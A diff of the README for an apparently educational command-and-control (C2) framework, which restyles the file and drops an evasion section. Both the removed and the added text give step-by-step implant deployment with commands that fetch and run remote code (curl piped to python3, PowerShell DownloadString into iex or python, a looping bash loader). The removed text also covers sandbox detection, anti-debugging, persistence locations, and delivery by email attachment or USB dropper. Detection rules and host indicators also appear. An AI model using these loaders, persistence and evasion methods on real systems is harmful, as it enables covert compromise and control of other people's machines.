@@ -1,16 +1,38 @@
-# 🕶️ C2 Framework - Enterprise-Grade Command & Control Infrastructure
+# 🕶️ C2 Framework
 
-[![Educational Purpose Only](https://img.shields.io/badge/Purpose-Educational%20Only-red)](LICENSE)
-[![Python Version](https://img.shields.io/badge/Python-3.8%2B-blue)](https://python.org)
-[![License](https://img.shields.io/badge/License-Educational%20Use%20Only-yellow)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)]()
+<div align="center">
 
-> **⚠️ WARNING: EDUCATIONAL PURPOSE ONLY**  
-> This framework is designed exclusively for cybersecurity training, penetration testing with written authorization, and controlled laboratory environments. Unauthorized use against systems you do not own or have explicit permission to test is **ILLEGAL**.
+### Enterprise-Grade Command & Control Infrastructure
+
+Educational Red Teaming • Detection Engineering • Malware Analysis • Lab Simulation
+
+<br>
+
+![Educational Purpose](https://img.shields.io/badge/Purpose-Educational%20Only-red?style=for-the-badge)
+![Python](https://img.shields.io/badge/Python-3.8+-blue?style=for-the-badge&logo=python)
+![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey?style=for-the-badge)
+![License](https://img.shields.io/badge/License-Educational%20Use%20Only-yellow?style=for-the-badge)
+
+</div>
 
 ---
 
-## 📋 Table of Contents
+> ## ⚠️ WARNING — EDUCATIONAL PURPOSE ONLY
+>
+> This framework is intended exclusively for:
+>
+> - Cybersecurity education
+> - Malware analysis training
+> - Authorized penetration testing
+> - Red team simulations
+> - Controlled lab environments
+>
+> Unauthorized use against systems you do not own or explicitly have permission to test is illegal and unethical.
+
+---
+
+# 📋 Table of Contents
+
 - [Overview](#-overview)
 - [Features](#-features)
 - [Architecture](#-architecture)
@@ -19,7 +41,6 @@
 - [Detailed Installation](#-detailed-installation)
 - [Usage Guide](#-usage-guide)
 - [Cross-Platform Deployment](#-cross-platform-deployment)
-- [Evasion Techniques Implemented](#-evasion-techniques-implemented)
 - [Detection & Defense](#-detection--defense)
 - [Troubleshooting](#-troubleshooting)
 - [Educational Modules](#-educational-modules)
@@ -30,647 +51,525 @@
 
 ---
 
-## 🎯 Overview
+# 🎯 Overview
 
-This **Command & Control (C2) Framework** is a comprehensive educational tool designed to demonstrate how attackers establish covert communication channels, maintain persistence, and evade detection in compromised environments. Built for cybersecurity professionals, red teamers, blue teamers, and students to understand real-world attacker tradecraft.
+This **C2 Framework** is an educational command-and-control simulation platform designed to demonstrate how modern post-exploitation infrastructure works in controlled cybersecurity labs.
 
-### What You'll Learn
-- ✅ How C2 channels operate under the hood
-- ✅ Beaconing algorithms and jitter implementation
-- ✅ Encrypted communication protocols
-- ✅ Cross-platform persistence mechanisms
-- ✅ Detection evasion techniques
-- ✅ Network traffic analysis for C2 detection
+The framework helps:
+- Red Teamers
+- Blue Teamers
+- SOC Analysts
+- Malware Analysts
+- Students
+- Cybersecurity Researchers
+
+understand:
+- Beaconing mechanisms
+- Encrypted communications
+- Persistence techniques
+- Detection engineering
+- Adversary tradecraft
+- Incident response workflows
 
 ---
 
-## ✨ Features
+# ✨ Features
 
-### Core Capabilities
+## 🧠 Core Capabilities
+
 | Feature | Description | Status |
-|---------|-------------|--------|
-| **Multi-Platform Implant** | Windows, Linux, macOS support | ✅ |
-| **HTTP/HTTPS C2 Channels** | Encrypted communication | ✅ |
-| **Web Dashboard** | Real-time operator console | ✅ |
-| **Multi-Agent Management** | Control multiple hosts simultaneously | ✅ |
-| **Task Queuing** | Asynchronous command execution | ✅ |
-| **File Transfer** | Upload/download capabilities | ✅ |
-| **Persistence** | Registry, crontab, launchd | ✅ |
-| **Screen Capture** | Remote screenshot capability | ✅ |
-
-### Technical Specifications
-- **Server**: Flask-based REST API
-- **Encryption**: AES-256-GCM + RSA-2048 (optional)
-- **Beacon Interval**: Configurable with jitter (1-60 seconds)
-- **Database**: SQLite (lightweight) / MySQL (production)
-- **Communication**: JSON over HTTP/HTTPS
-
----
-─────────────────────────────────────────────────────────────────┐
-│ OPERATOR ZONE │
-├─────────────────────────────────────────────────────────────────┤
-│ │
-│ ┌──────────────┐ ┌──────────────┐ │
-│ │ Web UI │◄───────►│ CLI Tool │ │
-│ │ Port 5000 │ │ (Optional) │ │
-│ └──────┬───────┘ └──────────────┘ │
-│ │ │
-│ ▼ │
-│ ┌──────────────────────────────────────────┐ │
-│ │ C2 SERVER (Flask) │ │
-│ │ Port 443 (HTTPS) / 5000 (HTTP) │ │
-│ └──────────────┬───────────────────────────┘ │
-│ │ │
-│ │ Encrypted C2 Channel │
-│ │ (HTTP/HTTPS + AES/RSA) │
-└──────────────────┼────────────────────────────────────────────────┘
-│
-▼
-┌─────────────────────────────────────────────────────────────────┐
-│ COMPROMISED ZONE │
-├─────────────────────────────────────────────────────────────────┤
-│ │
-│ ┌──────────────┐ ┌──────────────┐ ┌──────────────┐ │
-│ │ Implant │ │ Implant │ │ Implant │ │
-│ │ (Windows) │ │ (Linux) │ │ (macOS) │ │
-│ └──────────────┘ └──────────────┘ └──────────────┘ │
-│ │
-│ Each Implant: │
-│ • Beacons at random intervals │
-│ • Executes remote commands │
-│ • Exfiltrates data │
-│ • Maintains persistence │
-└─────────────────────────────────────────────────────────────────┘
-
-### Communication Flow
-1. **Registration**: Implant → Server (system info, key exchange)
-2. **Beaconing**: Implant → Server (heartbeat, task check)
-3. **Task Assignment**: Server → Implant (command execution)
-4. **Result Delivery**: Implant → Server (command output)
+|---|---|---|
+| Multi-Platform Agents | Windows / Linux / macOS | ✅ |
+| HTTP/HTTPS C2 Channels | REST-based encrypted communications | ✅ |
+| Real-Time Dashboard | Operator web console | ✅ |
+| Multi-Agent Support | Simultaneous agent management | ✅ |
+| Task Queue System | Async command execution | ✅ |
+| File Transfer | Upload / Download simulation | ✅ |
+| Persistence Modules | OS-specific persistence examples | ✅ |
+| Screenshot Module | Educational remote screen capture | ✅ |
 
 ---
 
-## 🖥️ Lab Setup Requirements
+# 🔧 Technical Specifications
 
-### Hardware Requirements
+| Component | Technology |
+|---|---|
+| Backend | Flask REST API |
+| Encryption | AES-256-GCM |
+| Database | SQLite / MySQL |
+| Dashboard | HTML5 + JavaScript |
+| Communication | JSON over HTTP/HTTPS |
+| Beaconing | Configurable jitter |
+
+---
+
+# 🏗️ Architecture
+
+```text
+┌────────────────────────────────────────────────────────────┐
+│                    OPERATOR ZONE                           │
+├────────────────────────────────────────────────────────────┤
+│                                                            │
+│  ┌──────────────┐      ┌──────────────┐                    │
+│  │   Web UI     │◄────►│   CLI Tool   │                    │
+│  │   Port 5000  │      │  (Optional)  │                    │
+│  └──────┬───────┘      └──────────────┘                    │
+│         │                                                  │
+│         ▼                                                  │
+│  ┌──────────────────────────────────────────────────────┐  │
+│  │              C2 SERVER (Flask)                       │  │
+│  │          Port 443 / 5000 (HTTPS/HTTP)               │  │
+│  └──────────────────┬───────────────────────────────────┘  │
+│                     │                                      │
+└─────────────────────┼──────────────────────────────────────┘
+                      │
+                      ▼
+┌────────────────────────────────────────────────────────────┐
+│                  EDUCATIONAL LAB ZONE                      │
+├────────────────────────────────────────────────────────────┤
+│                                                            │
+│  ┌────────────┐ ┌────────────┐ ┌────────────┐              │
+│  │ Windows VM │ │ Linux VM   │ │ macOS VM   │              │
+│  └────────────┘ └────────────┘ └────────────┘              │
+│                                                            │
+│  Simulated Educational Agents:                             │
+│  • Beaconing                                               │
+│  • Task Retrieval                                          │
+│  • Secure Communication                                    │
+│  • Persistence Simulation                                  │
+└────────────────────────────────────────────────────────────┘
+```
+
+---
+
+# 🔄 Communication Flow
+
+1. Agent Registration
+2. Key Exchange
+3. Beacon Check-In
+4. Task Assignment
+5. Result Submission
+
+---
+
+# 🖥️ Lab Setup Requirements
+
+# Hardware Requirements
+
 | Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| **RAM** | 8GB | 16GB |
-| **CPU** | 2 cores | 4+ cores |
-| **Storage** | 20GB | 50GB SSD |
-| **Network** | Isolated lab network | Host-Only + NAT |
+|---|---|---|
+| RAM | 8GB | 16GB |
+| CPU | 2 Cores | 4+ Cores |
+| Storage | 20GB | 50GB SSD |
+| Network | Host-Only | Isolated VLAN |
 
-### Software Requirements
-```bash
+---
+
 # Operating Systems
-- C2 Server: Kali Linux 2024+ / Ubuntu 22.04+
-- Target Machines: Windows 10/11, Ubuntu 20.04+, macOS 12+
 
-# Python Dependencies
+## C2 Server
+- Kali Linux 2024+
+- Ubuntu 22.04+
+
+## Target Systems
+- Windows 10/11
+- Ubuntu 20.04+
+- macOS Ventura+
+
+---
+
+# 📦 Dependencies
+
+```bash
 Python 3.8+
 Flask
+Flask-CORS
 Requests
-PyCryptodome (optional, for encryption)
-Virtual Network Configuration
-┌─────────────────────────────────────────────────┐
-│            VIRTUALBOX NETWORK SETUP              │
-├─────────────────────────────────────────────────┤
-│                                                   │
-│   [Kali VM] ─────┐                               │
-│   (172.24.1.83)  │                               │
-│                  │    Host-Only Network          │
-│   [Windows VM] ──┼──── 192.168.56.0/24          │
-│   (192.168.56.10)│    or Bridged Adapter        │
-│                  │                               │
-│   [Ubuntu VM] ───┘                               │
-│   (192.168.56.11)                                │
-└─────────────────────────────────────────────────┘
-🚀 Quick Start Guide
-5-Minute Setup
-Step 1: Clone Repository (On Kali/Server)
-bash
-git clone https://github.com/yourusername/c2-framework.git
-cd c2-framework
-chmod +x setup.sh
-sudo ./setup.sh
-Step 2: Start C2 Server
-bash
-# Terminal 1 - Start the C2 server
+PyCryptodome
+```
+
+---
+
+# 🌐 Example Virtual Lab
+
+```text
+┌────────────────────────────────────────────┐
+│            VIRTUALBOX LAB                  │
+├────────────────────────────────────────────┤
+│                                            │
+│ [Kali Linux]    172.24.1.83                │
+│ [Windows VM]    192.168.56.10              │
+│ [Ubuntu VM]     192.168.56.11              │
+│                                            │
+│ Network: Host-Only / Bridged               │
+└────────────────────────────────────────────┘
+```
+
+---
+
+# 🚀 Quick Start Guide
+
+# Step 1 — Clone Repository
+
+```bash
+git clone https://github.com/parrysecurity/C2-Framework.git
+
+cd C2-Framework
+```
+
+---
+
+# Step 2 — Install Dependencies
+
+```bash
+pip3 install flask flask-cors requests pycryptodome
+```
+
+---
+
+# Step 3 — Start C2 Server
+
+```bash
 python3 c2_server_http.py
-Expected output:
+```
 
-text
-============================================================
-C2 HTTP Server Started Successfully!
-============================================================
-[+] Dashboard URL: http://172.24.1.83:5000
-[+] API Endpoint: http://172.24.1.83:5000/api
-[+] Press Ctrl+C to stop the server
-============================================================
-Step 3: Start File Server (For Payload Distribution)
-bash
-# Terminal 2 - Share payloads via HTTP
-cd ~/c2-framework/payloads
+Expected:
+
+```text
+==================================================
+C2 HTTP Server Started Successfully
+==================================================
+Dashboard: http://127.0.0.1:5000
+API:       http://127.0.0.1:5000/api
+==================================================
+```
+
+---
+
+# Step 4 — Host Educational Payloads
+
+```bash
+cd payloads
+
 python3 -m http.server 8000
-Step 4: Deploy Implant to Target (Windows VM)
-powershell
-# On Windows PowerShell (Admin)
-curl -o C:\implant.py http://172.24.1.83:8000/windows_implant.py
-python C:\implant.py
-Step 5: Access Web Dashboard
-Open browser on Windows/Kali:
+```
 
-text
-http://172.24.1.83:5000
-✅ You're now controlling a remote system!
+---
 
-📥 Detailed Installation
-On Kali/Ubuntu (C2 Server)
-bash
-# 1. System Update
-sudo apt update && sudo apt upgrade -y
+# Step 5 — Access Dashboard
 
-# 2. Install Dependencies
-sudo apt install -y python3 python3-pip git openssl
+```text
+http://127.0.0.1:5000
+```
 
-# 3. Create Project Directory
-mkdir -p ~/c2-framework/{server,payloads,logs}
-cd ~/c2-framework
+---
 
-# 4. Install Python Packages
-pip3 install flask flask-cors requests
+# 📥 Detailed Installation
 
-# 5. Create SSL Certificate (for HTTPS)
-openssl req -x509 -newkey rsa:4096 -nodes \
-  -out cert.pem -keyout key.pem \
-  -days 365 -subj "/C=US/ST=State/L=City/O=C2/CN=localhost"
+# Kali / Ubuntu
 
-# 6. Verify Installation
-python3 -c "import flask; print('Flask OK')"
-On Windows VM (Target Machine)
-powershell
-# 1. Install Chocolatey (Package Manager)
-Set-ExecutionPolicy Bypass -Scope Process -Force
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
-iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
-
-# 2. Install Python via Chocolatey
-choco install python -y
-
-# 3. Refresh Environment Variables
-refreshenv
-
-# 4. Install Required Python Package
-pip install requests
-
-# 5. Verify Python Installation
-python --version
-On Linux Target (Ubuntu/Debian)
-bash
-# Install Python if not present
+```bash
 sudo apt update
-sudo apt install -y python3 python3-pip
 
-# Install requests
-pip3 install requests
+sudo apt install -y \
+python3 \
+python3-pip \
+git \
+openssl
 
-# Run implant
-python3 implant.py
-📖 Usage Guide
-Web Dashboard Interface
-1. Agent Management
-View Agents: All connected agents appear in left panel
+pip3 install \
+flask \
+flask-cors \
+requests \
+pycryptodome
+```
 
-Agent Details: Hostname, username, OS, IP address
+---
 
-Status Indicators: Green = Active, Red = Inactive
+# Generate SSL Certificate
 
-2. Command Execution
-Available Commands:
-┌─────────────────┬────────────────────────────────────────┐
-│ Command         │ Description                            │
-├─────────────────┼────────────────────────────────────────┤
-│ whoami          │ Display current user                   │
-│ ipconfig        │ Network configuration (Windows)        │
-│ ifconfig        │ Network configuration (Linux/macOS)    │
-│ dir / ls        │ List directory contents                │
-│ cd <path>       │ Change working directory               │
-│ tasklist / ps   │ List running processes                 │
-│ systeminfo      │ System information                     │
-│ netstat -an     │ Network connections                    │
-│ echo "text"     │ Write to file                          │
-│ type <file>     │ Read file contents                     │
-└─────────────────┴────────────────────────────────────────┘
-3. Sending Commands
-bash
-# Method 1: Web Dashboard
-1. Click on agent in left panel
-2. Type command in input box
-3. Press Enter or click Execute
+```bash
+openssl req -x509 -newkey rsa:4096 -nodes \
+-out cert.pem \
+-keyout key.pem \
+-days 365
+```
 
-# Method 2: Direct API
-curl -X POST http://C2_IP:5000/api/send_command \
-  -H "Content-Type: application/json" \
-  -d '{"agent_id":"AGENT_ID","command":"whoami"}'
-CLI Operations (Advanced)
-bash
-# List all agents
-curl http://172.24.1.83:5000/api/agents
+---
 
-# Send command to specific agent
-curl -X POST http://172.24.1.83:5000/api/send_command \
-  -H "Content-Type: application/json" \
-  -d '{"agent_id":"df73f1e0","command":"whoami"}'
+# Verify Installation
 
-# Get task results for agent
-curl http://172.24.1.83:5000/api/task_results/df73f1e0
+```bash
+python3 -c "import flask; print('Flask OK')"
+```
 
-# Register test agent (debugging)
-curl -X POST http://172.24.1.83:5000/api/register \
-  -H "Content-Type: application/json" \
-  -d '{"hostname":"test","username":"user","os_type":"Linux","ip_address":"127.0.0.1"}'
-🔄 Cross-Platform Deployment
-Generate Payloads for Different OS
-Windows Payloads
-bash
-# On Kali - Generate Windows payloads
-cd ~/c2-framework/payloads
+---
 
-# Python script (requires Python on target)
-python3 -c "print(open('windows_implant.py').read())" > implant.py
+# 📖 Usage Guide
 
-# PowerShell loader
-cat > loader.ps1 << 'EOF'
-$wc=New-Object System.Net.WebClient
-$wc.DownloadString('http://172.24.1.83:8000/implant.py') | python -
-EOF
+# Agent Management
 
-# Batch file loader
-cat > loader.bat << 'EOF'
-@echo off
-powershell -ExecutionPolicy Bypass -File loader.ps1
-EOF
-Linux/macOS Payloads
-bash
-# Bash one-liner
-curl -s http://172.24.1.83:8000/implant.py | python3 &
+Features:
+- Agent registration
+- Online/offline tracking
+- System metadata
+- Command history
 
-# Persistent script
-cat > implant.sh << 'EOF'
-#!/bin/bash
-while true; do
-    python3 -c "$(curl -s http://172.24.1.83:8000/implant.py)" 2>/dev/null
-    sleep 60
-done
-EOF
-chmod +x implant.sh
-Deployment Methods
-Method	Command	Use Case
-Direct Download	curl -o implant.py http://C2_IP:8000/implant.py	Quick testing
-PowerShell	powershell -c "iex (New-Object Net.WebClient).DownloadString('http://C2_IP:8000/loader.ps1')"	Windows stealth
-SMB Share	copy \\C2_IP\share\implant.py .	Internal networks
-Email Attachment	Manual delivery	Social engineering
-USB Dropper	Physical access	Air-gapped networks
-🛡️ Evasion Techniques Implemented
-Network Evasion
-python
-# 1. Beacon Jitter - Random delays to avoid pattern detection
-sleep_time = base_sleep + random.randint(-jitter, jitter)
+---
 
-# 2. User-Agent Randomization
-user_agents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
-    'Mozilla/5.0 (X11; Linux x86_64)'
-]
+# Available Educational Commands
 
-# 3. Domain Fronting (HTTPS)
-# Host header differs from connection domain
+| Command | Description |
+|---|---|
+| whoami | Current user |
+| ipconfig / ifconfig | Network configuration |
+| systeminfo | OS information |
+| dir / ls | Directory listing |
+| tasklist / ps | Running processes |
+| netstat -an | Network connections |
 
-# 4. Encrypted Payloads (AES-256-GCM)
-cipher = AES.new(session_key, AES.MODE_GCM)
-Host Evasion
-python
-# 1. Sandbox Detection
-def is_sandbox():
-    checks = [
-        os.path.exists('/.dockerenv'),
-        os.path.exists('/.dockerinit'),
-        'vbox' in platform.uname().version.lower()
-    ]
-    return any(checks)
+---
 
-# 2. Anti-Debug
-def anti_debug():
-    import sys
-    if sys.gettrace() is not None:
-        sys.exit(0)
+# API Example
 
-# 3. Process Hollowing (Windows)
-# Inject into legitimate processes
-Persistence Mechanisms
-OS	Method	Location
-Windows	Registry Run Key	HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-Windows	Scheduled Task	schtasks /create
-Windows	Startup Folder	%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
-Linux	Crontab	@reboot python3 /path/to/implant.py
-Linux	Systemd Service	/etc/systemd/system/
-Linux	.bashrc/.profile	~/.bashrc, ~/.profile
-macOS	Launch Agent	~/Library/LaunchAgents/
-macOS	Login Hook	defaults write com.apple.loginwindow
-🔍 Detection & Defense
-How Blue Teams Can Detect This C2
-Network Indicators
-yaml
-Beacon Patterns:
-  - Regular intervals with jitter (5-15 seconds)
-  - HTTP POST to /api/beacon, /api/register
-  - JSON payloads with agent_id field
-  - Unusual User-Agent strings
+```bash
+curl -X POST http://127.0.0.1:5000/api/send_command \
+-H "Content-Type: application/json" \
+-d '{"agent_id":"demo","command":"whoami"}'
+```
 
-Detection Rules (Snort/Suricata):
-  alert tcp $HOME_NET any -> $EXTERNAL_NET 5000 
-    (msg:"Potential C2 Beacon"; 
-     content:"/api/beacon"; http_uri; 
-     sid:1000001;)
-Host Indicators
-yaml
-Windows:
-  - Suspicious Python processes
-  - Registry run keys with python.exe
-  - Unusual scheduled tasks
-  - Temp directory Python scripts
+---
 
-Linux:
-  - Unexpected crontab entries
-  - Systemd services named oddly
-  - Outbound connections on port 5000/443
-  - Python processes with network connections
-Memory Forensics (Volatility)
-bash
-# Detect injected code
-vol.py -f memory.dump --profile=Win10x64 malfind
+# 🔄 Cross-Platform Deployment
 
-# List network connections
-vol.py -f memory.dump netscan
+# Windows Educational Loader
 
-# Detect hidden processes
-vol.py -f memory.dump pslist
-Defensive Measures
-powershell
-# 1. Block outbound ports
-New-NetFirewallRule -DisplayName "Block C2 Ports" -Direction Outbound -LocalPort 5000,8000,4443 -Protocol TCP -Action Block
+```powershell
+curl -o implant.py http://SERVER_IP:8000/windows_implant.py
 
-# 2. Monitor Python execution
-auditpol /set /subcategory:"Process Creation" /success:enable
+python implant.py
+```
 
-# 3. AppLocker rules (Windows)
-# Restrict script execution to specific directories
+---
 
-# 4. EDR Detection
-# Monitor for beaconing patterns, unusual parent-child processes
-🐛 Troubleshooting
-Common Issues & Solutions
-Issue	Cause	Solution
-"Connection refused"	Server not running	python3 c2_server_http.py
-"No module named flask"	Missing dependency	pip3 install flask flask-cors
-Agents not showing	Network isolation	Check VM network settings
-Commands timeout	Firewall blocking	sudo ufw allow 5000
-SSL certificate error	Self-signed cert	Use verify=False or HTTP
-Python not found (Windows)	Python not installed	Install from python.org
-Debug Commands
-bash
-# Check if server is listening
+# Linux/macOS Educational Loader
+
+```bash
+curl -s http://SERVER_IP:8000/implant.py | python3
+```
+
+---
+
+# 🛡️ Detection & Defense
+
+This project also teaches defensive concepts.
+
+# Network Indicators
+
+```yaml
+Indicators:
+  - Repeated HTTP POST requests
+  - Beacon intervals with jitter
+  - Suspicious User-Agent strings
+  - JSON payloads to /api/beacon
+```
+
+---
+
+# Host Indicators
+
+## Windows
+- Unusual Python processes
+- Registry Run keys
+- Scheduled Tasks
+
+## Linux
+- Suspicious crontab entries
+- Unknown outbound connections
+- Persistence scripts
+
+---
+
+# Example Detection Rule
+
+```yaml
+alert tcp $HOME_NET any -> $EXTERNAL_NET 5000 \
+(msg:"Potential C2 Beacon";
+ content:"/api/beacon";
+ sid:1000001;)
+```
+
+---
+
+# 🐛 Troubleshooting
+
+| Issue | Cause | Solution |
+|---|---|---|
+| Connection Refused | Server offline | Start Flask server |
+| Flask Module Missing | Dependency issue | pip3 install flask |
+| Agents Offline | Firewall issue | Allow port 5000 |
+| SSL Errors | Self-signed certificate | Use verify=False |
+
+---
+
+# Useful Debug Commands
+
+```bash
 sudo netstat -tlnp | grep 5000
 
-# Test API locally
 curl http://localhost:5000/api/agents
 
-# View server logs
-tail -f /var/log/c2-server.log
+tail -f logs/errors.log
+```
 
-# Test connectivity from Windows
-Test-NetConnection 172.24.1.83 -Port 5000
-ping 172.24.1.83
+---
 
-# Restart everything
-sudo fuser -k 5000/tcp
-python3 c2_server_http.py
-VirtualBox Network Fix
-bash
-# On Kali - Reset network
-sudo systemctl restart networking
-sudo dhclient -r
-sudo dhclient
+# 📚 Educational Modules
 
-# On Windows - Reset network
-ipconfig /release
-ipconfig /renew
-netsh winsock reset
+| Module | Objective |
+|---|---|
+| Beaconing | Understand periodic callbacks |
+| Encryption | Learn AES secure communication |
+| Persistence | Study OS persistence mechanisms |
+| Detection | Build Sigma/YARA rules |
+| Evasion | Analyze anti-analysis concepts |
 
-# Both VMs should use same adapter type
-# Recommended: Bridged Adapter or Host-Only
-📚 Educational Modules
-Module 1: C2 Communication Basics
-Objective: Understand beaconing and tasking
+---
 
-Exercise: Modify beacon interval and observe traffic
+# 📁 Project Structure
 
-Module 2: Encryption Implementation
-Objective: Implement AES encryption for C2 traffic
-
-Exercise: Add encryption layer to implant-server communication
-
-Module 3: Evasion Techniques
-Objective: Learn common evasion methods
-
-Exercise: Implement process injection or DLL sideloading
-
-Module 4: Persistence Mechanisms
-Objective: Understand persistence across OSes
-
-Exercise: Add new persistence method (e.g., WMI Event Subscription)
-
-Module 5: Detection Engineering
-Objective: Create detection rules for C2 traffic
-
-Exercise: Write YARA/Sigma rules to detect this framework
-
-📁 Project Structure
-text
+```text
 c2-framework/
-├── 📄 README.md                    # Documentation
-├── 📄 LICENSE                      # Educational use license
-├── 📄 setup.sh                     # Automated setup script
 │
-├── 🐍 c2_server_http.py           # HTTP C2 server (recommended)
-├── 🐍 c2_server_https.py          # HTTPS C2 server (SSL)
-├── 🐍 c2_server_robust.py         # Production-ready server
+├── README.md
+├── LICENSE
+├── setup.sh
 │
-├── 📁 payloads/
-│   ├── 🐍 windows_implant.py      # Windows/Linux/macOS agent
-│   ├── 📜 loader.ps1              # PowerShell loader
-│   ├── 📜 loader.bat              # Batch loader
-│   ├── 📜 implant.sh              # Linux/macOS script
-│   └── 📜 loader.vbs              # VBScript loader
+├── c2_server_http.py
+├── c2_server_https.py
+├── c2_server_robust.py
 │
-├── 📁 modules/
-│   ├── 🐍 crypto.py               # Encryption utilities
-│   ├── 🐍 evasion.py              # Anti-detection methods
-│   └── 🐍 persistence.py          # Persistence modules
+├── payloads/
+│   ├── windows_implant.py
+│   ├── loader.ps1
+│   ├── loader.bat
+│   └── implant.sh
 │
-├── 📁 web/
-│   ├── 🎨 dashboard.html          # Web UI template
-│   ├── 🎨 style.css               # Styling
-│   └── 📜 console.js              # Frontend logic
+├── modules/
+│   ├── crypto.py
+│   ├── evasion.py
+│   └── persistence.py
 │
-├── 📁 logs/
-│   ├── 📄 agents.log              # Agent activity
-│   ├── 📄 commands.log            # Command history
-│   └── 📄 errors.log              # Error logging
+├── web/
+│   ├── dashboard.html
+│   ├── style.css
+│   └── console.js
 │
-└── 📁 docs/
-    ├── 📄 architecture.md         # System design
-    ├── 📄 deployment.md           # Deployment guide
-    └── 📄 detection.md            # Detection strategies
-⚖️ Legal & Ethics
-Acceptable Use
-✅ Permitted:
+├── logs/
+│
+└── docs/
+```
 
-Cybersecurity training in isolated labs
+---
 
-Penetration testing with written authorization
+# ⚖️ Legal & Ethics
 
-Academic research in controlled environments
+# ✅ Permitted Usage
 
-CTF competitions and red team exercises
+- Educational labs
+- Red team exercises
+- Malware analysis
+- Academic research
+- Detection engineering
 
-❌ Prohibited:
+---
 
-Unauthorized access to any system
+# ❌ Prohibited Usage
 
-Deployment on production systems without permission
+- Unauthorized access
+- Production deployment
+- Data theft
+- Malicious activity
+- Illegal operations
 
-Malicious use for data theft or damage
+---
 
-Violation of computer fraud laws
+# Responsible Use
 
-Legal Compliance
-yaml
-Laws & Regulations:
-  - CFAA (US): Computer Fraud and Abuse Act
-  - GDPR (EU): General Data Protection Regulation
-  - Computer Misuse Act (UK)
-  - Similar laws in your jurisdiction
+Always ensure:
+- Written authorization
+- Defined scope
+- Isolated lab environment
+- Compliance with local laws
 
-Authorization Requirements:
-  - Written permission from system owner
-  - Defined scope of testing
-  - Confidentiality agreements
-  - Reporting requirements
-Responsible Disclosure
-If you discover security issues in this framework:
+---
 
-Do not exploit for unauthorized purposes
+# 🤝 Contributing
 
-Report to maintainers immediately
+Contributions are welcome.
 
-Allow 90 days for fixes before public disclosure
+## Workflow
 
-🤝 Contributing
-Areas for Contribution
-🐛 Bug fixes and stability improvements
+```bash
+git checkout -b feature/new-feature
 
-🔒 Additional evasion techniques
+git commit -m "Add feature"
 
-🖥️ More platform support (Android, iOS)
+git push origin feature/new-feature
+```
 
-📊 Enhanced reporting features
+Then submit a Pull Request.
 
-🔌 Plugin system for modules
+---
 
-🧪 Unit tests and CI/CD pipeline
+# 📄 License
 
-How to Contribute
-bash
-1. Fork repository
-2. Create feature branch
-   git checkout -b feature/amazing-feature
-3. Commit changes
-   git commit -m 'Add amazing feature'
-4. Push to branch
-   git push origin feature/amazing-feature
-5. Open Pull Request
-Coding Standards
-Python: PEP 8 compliance
-
-Comments: Required for complex logic
-
-Testing: Add tests for new features
-
-Documentation: Update README accordingly
-
-📄 License
-text
+```text
 EDUCATIONAL USE ONLY LICENSE
 
-Copyright (c) 2024 C2 Framework Contributors
+This project is provided strictly for:
+- Cybersecurity education
+- Defensive research
+- Authorized testing
+- Controlled environments
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software for EDUCATIONAL PURPOSES ONLY, subject to the following conditions:
+Unauthorized usage is prohibited.
+```
 
-1. The software may only be used in controlled laboratory environments
-2. Written authorization must be obtained before testing any system
-3. The software may not be used for any malicious purposes
-4. This notice shall be included in all copies or substantial portions
+---
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
+# 📚 Recommended Reading
 
-THE AUTHORS ARE NOT RESPONSIBLE FOR ANY ILLEGAL USE OF THIS SOFTWARE.
-📞 Support & Resources
-Documentation
-Detailed Wiki
+- MITRE ATT&CK Framework
+- Malware Analysis Techniques
+- Detection Engineering
+- Red Team Operations
+- Blue Team Methodologies
 
-API Reference
+---
 
-Video Tutorials
+# 📊 Project Status
 
-Community
-Discord Server: [Invite Link]
+```text
+🟢 ACTIVE — Educational Research Project
 
-Twitter: [@C2Framework]
+Supported Platforms:
+✅ Windows
+✅ Linux
+✅ macOS
 
-Email: c2-framework@educational.org
+Python Version:
+✅ 3.8+
+```
 
-Recommended Reading
-"Command and Control" by Rob Joyce (NSA)
+---
 
-"C2 Threat Intelligence" by MITRE ATT&CK
+<div align="center">
 
-"Malware Analysis and Detection" by Michael Sikorski
+# 🛡️ Learn Offense to Build Better Defense
 
-⭐ Acknowledgments
-MITRE ATT&CK Framework for TTP classification
+Educational Research Project by ParrySecurity
 
-Open Source Community for libraries
+⭐ Star the repository if you found it useful.
 
-Cybersecurity educators worldwide
-
-📊 Project Status
-text
-🟢 ACTIVE - Educational Maintenance Mode
-
-Last Updated: 2024
-Python Version: 3.8+
-Tested On:
-  ✅ Kali Linux 2024.1
-  ✅ Ubuntu 22.04 LTS
-  ✅ Windows 10/11
-  ✅ macOS Ventura+
-Remember: With great power comes great responsibility. Use this knowledge to defend, not exploit.
-
-
-
-## 🏗️ Architecture
+</div>
